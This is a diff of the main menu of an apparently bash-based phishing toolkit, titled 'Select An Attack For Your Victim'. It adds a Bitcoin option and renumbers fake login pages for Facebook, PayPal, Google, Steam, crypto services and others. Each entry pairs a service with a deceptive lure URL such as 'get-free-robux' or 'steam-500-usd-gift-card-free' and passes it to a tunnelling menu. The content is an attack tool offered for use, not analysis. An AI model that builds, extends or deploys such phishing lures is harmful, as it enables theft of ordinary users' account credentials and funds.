@@ -885,15 +885,15 @@ main_menu() {
 	cat <<- EOF
 		${RED}Select An Attack For Your Victim
 
-		${WHITE}1. Facebook		${WHITE}10. Spotify
-		${WHITE}2. Instagram		${WHITE}11. Github
-		${WHITE}3. Google		${WHITE}12. Discord
-		${WHITE}4. Cryto		${WHITE}13. Roblox
-		${WHITE}5. Microsoft		${WHITE}14. Steam
-		${WHITE}6. Netflix		${WHITE}15. Playstation
-		${WHITE}7. Paypal		${WHITE}16. Xbox
-		${WHITE}8. Tiktok		${WHITE}17. Verizon
-		${WHITE}9. Snapchat		${WHITE}18. will add more when i feel like it
+		${WHITE}1. Facebook		${WHITE}10. Snapchat
+		${WHITE}2. Instagram		${WHITE}11. Spotify
+		${WHITE}3. Google		${WHITE}12. Github
+		${WHITE}4. Bitcoin		${WHITE}13. Discord
+		${WHITE}5. Crypto		${WHITE}14. Roblox
+		${WHITE}6. Microsoft		${WHITE}15. Steam
+		${WHITE}7. Netflix		${WHITE}16. Playstation
+		${WHITE}8. Paypal		${WHITE}17. Xbox
+		${WHITE}9. Tiktok		${WHITE}18. Verizon
 		
 		${WHITE}99. About         ${WHITE}0. Exit
 	EOF
@@ -907,59 +907,62 @@ main_menu() {
 			site_instagram;;
 		3 | 03)
 			site_gmail;;
-		4| 04)
+		4 | 04)
+			website="bitcoin"
+			tunnel_menu;;
+		5 | 05)
 			website="cryptocurrency"
 			mask='https://get-free-cryto'
 			tunnel_menu;;
-		5 | 05)
+		6 | 06)
 			website="microsoft"
 			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
-		6 | 06)
+		7 | 07)
 			website="netflix"
 			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
-		7 | 07)
+		8 | 08)
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		8 | 08)
+		9 | 09)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		9 | 09)
+		10)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		10)
+		11)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		11)
+		12)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		12)
+		13)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		13)
+		14)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		14)
+		15)
 			website="steam"
 			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
-		15)
+		16)
 			website="playstation"
 			mask='https://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
-		16)
+		17)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		17)
+		18)
 			website="verizon"
 			mask='https://get-unlimited-data'
 			tunnel_menu;;
